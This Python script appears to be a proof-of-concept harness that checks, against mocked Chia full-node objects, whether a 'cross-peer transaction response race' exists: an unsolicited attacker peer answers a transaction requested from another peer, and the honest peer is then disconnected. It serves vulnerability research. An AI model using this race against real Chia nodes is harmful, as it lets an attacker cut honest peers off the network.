from __future__ import annotations

import asyncio
import inspect
import json
import re
from dataclasses import dataclass, field
from typing import Any
from unittest.mock import AsyncMock, MagicMock

from chia.full_node.full_node_api import FullNodeAPI
from chia.protocols import full_node_protocol
from chia.server.outbound_message import NodeType
from chia_rs import G2Element, SpendBundle
from chia_rs.sized_bytes import bytes32
from chia_rs.sized_ints import uint64


@dataclass
class Peer:
    peer_node_id: bytes32
    peer_host: str
    connection_type: NodeType = NodeType.FULL_NODE
    sent: list[Any] = field(default_factory=list)
    closed: list[dict[str, Any]] = field(default_factory=list)

    async def send_message(self, message: Any) -> None:
        self.sent.append(message)

    async def close(self, *args: Any, **kwargs: Any) -> None:
        self.closed.append({"args": repr(args), "kwargs": repr(kwargs)})


def pending_attr_and_container(api_source: str, node_source: str) -> tuple[str, Any]:
    names = re.findall(r"self\.full_node\.([A-Za-z_][A-Za-z0-9_]*pending[A-Za-z0-9_]*)", api_source, re.I)
    if not names:
        names = re.findall(r"self\.([A-Za-z_][A-Za-z0-9_]*pending[A-Za-z0-9_]*)", node_source, re.I)
    if not names:
        raise RuntimeError("pending transaction state attribute not found")
    name = sorted(names, key=lambda value: (("tx" not in value.lower() and "transaction" not in value.lower()), len(value)))[0]
    combined = api_source + "\n" + node_source
    if re.search(rf"{re.escape(name)}\.add\s*\(", combined) or re.search(rf"{re.escape(name)}\.discard\s*\(", combined):
        return name, set()
    return name, {}


def node_fixture(pending_name: str, pending_container: Any) -> MagicMock:
    node = MagicMock()
    setattr(node, pending_name, pending_container)
    node.sync_store = MagicMock()
    node.sync_store.get_sync_mode = MagicMock(return_value=False)
    node.mempool_manager = MagicMock()
    node.mempool_manager.seen = MagicMock(return_value=False)
    node.mempool_manager.get_min_fee_rate = MagicMock(return_value=0)
    node.mempool_manager.at_full_capacity = MagicMock(return_value=False)
    node.mempool_manager.get_mempool_item = MagicMock(return_value=None)
    node.mempool_manager.seen_bundle_hashes = {}
    node.add_transaction = AsyncMock(return_value=(None, None))
    node.respond_transaction = AsyncMock(return_value=None)
    node.server = MagicMock()
    node.config = {}
    return node


def new_transaction_request(tx_id: bytes32) -> Any:
    cls = full_node_protocol.NewTransaction
    signature = inspect.signature(cls)
    values = []
    for name in signature.parameters:
        lower = name.lower()
        if "transaction" in lower and ("id" in lower or "hash" in lower):
            values.append(tx_id)
        elif "cost" in lower or "fee" in lower:
            values.append(uint64(1))
        else:
            raise RuntimeError(f"unknown NewTransaction field: {name}")
    return cls(*values)


async def call(method: Any, request: Any, peer: Peer) -> dict[str, Any]:
    before_close = len(peer.closed)
    before_sent = len(peer.sent)
    try:
        returned = await method(request, peer)
        error = None
    except Exception as exception:
        returned = None
        error = f"{type(exception).__name__}: {exception}"
    return {
        "returned": repr(returned),
        "error": error,
        "closed": len(peer.closed) > before_close,
        "close_events": peer.closed[before_close:],
        "sent_count_delta": len(peer.sent) - before_sent,
    }


async def main() -> None:
    api_source = inspect.getsource(FullNodeAPI)
    try:
        from chia.full_node.full_node import FullNode
        node_source = inspect.getsource(FullNode)
    except Exception:
        node_source = ""
    pending_name, pending_container = pending_attr_and_container(api_source, node_source)
    print(f"PENDING_ATTRIBUTE={pending_name}")
    print(f"PENDING_CONTAINER={type(pending_container).__name__}")
    print("NEW_TRANSACTION_SOURCE_BEGIN")
    print(inspect.getsource(FullNodeAPI.new_transaction))
    print("NEW_TRANSACTION_SOURCE_END")
    print("RESPOND_TRANSACTION_SOURCE_BEGIN")
    print(inspect.getsource(FullNodeAPI.respond_transaction))
    print("RESPOND_TRANSACTION_SOURCE_END")

    transaction = SpendBundle([], G2Element())
    tx_id = transaction.name()
    announcement = new_transaction_request(tx_id)
    response = full_node_protocol.RespondTransaction(transaction)

    negative_node = node_fixture(pending_name, type(pending_container)())
    negative_api = FullNodeAPI(negative_node)
    peer_b0 = Peer(bytes32([0xB0] * 32), "198.51.100.20")
    negative = await call(negative_api.respond_transaction, response, peer_b0)

    node = node_fixture(pending_name, type(pending_container)())
    api = FullNodeAPI(node)
    peer_a = Peer(bytes32([0xA1] * 32), "198.51.100.10")
    peer_b = Peer(bytes32([0xB1] * 32), "198.51.100.20")
    announcement_result = await call(api.new_transaction, announcement, peer_a)
    pending_after_announcement = repr(getattr(node, pending_name))
    b_result = await call(api.respond_transaction, response, peer_b)
    pending_after_b = repr(getattr(node, pending_name))
    a_result = await call(api.respond_transaction, response, peer_a)
    pending_after_a = repr(getattr(node, pending_name))

    response_source = inspect.getsource(FullNodeAPI.respond_transaction)
    peer_binding = bool(re.search(r"pending[^\n]{0,240}peer_node_id|peer_node_id[^\n]{0,240}pending", response_source, re.I))
    node_binding = bool(re.search(rf"{re.escape(pending_name)}[^\n]{{0,200}}peer", api_source + node_source, re.I))

    evidence = {
        "negative": negative,
        "announcement": announcement_result,
        "peer_a_sent": len(peer_a.sent),
        "pending_after_announcement": pending_after_announcement,
        "attacker_b_response": b_result,
        "pending_after_b": pending_after_b,
        "honest_a_response": a_result,
        "pending_after_a": pending_after_a,
        "source_peer_binding": peer_binding,
        "node_state_peer_binding": node_binding,
        "add_transaction_calls": node.add_transaction.await_count,
        "respond_transaction_calls": node.respond_transaction.await_count,
    }
    print("EVIDENCE=" + json.dumps(evidence, sort_keys=True))

    requested_a = len(peer_a.sent) > 0 or tx_id.hex() in pending_after_announcement
    candidate = (
        negative["closed"]
        and requested_a
        and not b_result["closed"]
        and a_result["closed"]
        and not peer_binding
        and not node_binding
    )
    print(f"NEGATIVE_CONTROL_UNSOLICITED_B_CLOSED={negative['closed']}")
    print(f"NODE_REQUESTED_FROM_A={requested_a}")
    print(f"ATTACKER_B_ACCEPTED={not b_result['closed']}")
    print(f"HONEST_A_CLOSED_AFTER_RACE={a_result['closed']}")
    print(f"PEER_BINDING_PRESENT={peer_binding or node_binding}")
    if candidate:
        print("RESULT=CONFIRMED_CROSS_PEER_TRANSACTION_RESPONSE_RACE")
    else:
        print("RESULT=NO_CROSS_PEER_TRANSACTION_RESPONSE_RACE")


if __name__ == "__main__":
    asyncio.run(main())
